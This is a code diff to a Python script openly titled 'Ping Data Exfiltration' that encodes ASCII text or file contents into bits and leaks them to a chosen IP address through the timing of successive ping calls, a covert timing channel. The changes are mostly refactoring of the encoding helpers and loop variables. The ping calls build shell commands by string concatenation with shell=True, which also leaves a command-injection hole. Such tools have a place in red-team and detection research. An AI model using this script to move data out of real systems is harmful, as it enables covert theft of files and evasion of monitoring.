@@ -3,7 +3,6 @@ Ping Data Exfiltration
 This script will allow you to convert data into pings, like morse code
 Martino Jones 20180105
 
-
 """
 
 import argparse
@@ -36,7 +35,6 @@ show = False
 # Data type
 DATATYPE = "NONE"
 
-
 # Get additional wait time if user provided is
 if args.wait:
     wait = int(args.wait)
@@ -49,13 +47,20 @@ if args.ascii:
 if args.asciiFile:
     DATATYPE = "ASCIIFILE"
 
+def string2bits(s=''):
+    return [bin(ord(x))[2:].zfill(7) for x in s]
+
+def iter_bin(s):
+    sb = s.encode('ascii')
+    return (format(b, '07b') for b in sb)
 
 def main():
+
     # There will be a switch here to support other inputs later, example being a file
     # Someone wants to pass in ASCII or an ASCII file
     if DATATYPE == "ASCII" or DATATYPE == "ASCIIFILE":
         ASCIIDATA = ""
-        print("Encoding data")
+        print("Encoding data...")
 
         # Detect if they want ascii or an ascii file
         if DATATYPE == "ASCII":
@@ -67,9 +72,9 @@ def main():
         for line in ASCIIDATA:
             print("Line: " + line.rstrip())
             print("Encoded as: ")
-            for entry in line:
+            for char in line:
                 # Make sure everything is a number, convert if not
-                dataArray.append(''.join(s for s in iter_bin(entry)))
+                dataArray.append(''.join(s for s in iter_bin(char)))
                 print(dataArray[-1])
 
         ping(dataArray)
@@ -79,11 +84,6 @@ def main():
         print("\n***************\nYou need to provide a data type, example --ascii\n*****************\n")
         parser.print_help()
         exit(-1)
-
-
-def iter_bin(s):
-    sb = s.encode('ascii')
-    return (format(b, '07b') for b in sb)
 
 
 def ping(data):
@@ -97,14 +97,14 @@ def ping(data):
 
     # Being sending
     i = 0
-    for line in data:
-        for char in line:
+    for char in data:
+        for bit in char:
             # Run systems ping, not writing my own and send to devnull
-            print("ping_" + str(i) + " and sleep: " + str(int(char) + wait))
+            print("ping_" + str(i) + " and sleep: " + str(int(bit) + wait))
             subprocess.call(["ping -c 1 " + ipToPing], shell=True, stdout=FNULL)
 
             # Sleep for the desired amount of time
-            sleep(int(char) + wait)
+            sleep(int(bit) + wait)
             i = i + 1
 
     subprocess.call(["ping -c 1 " + ipToPing], shell=True, stdout=FNULL)
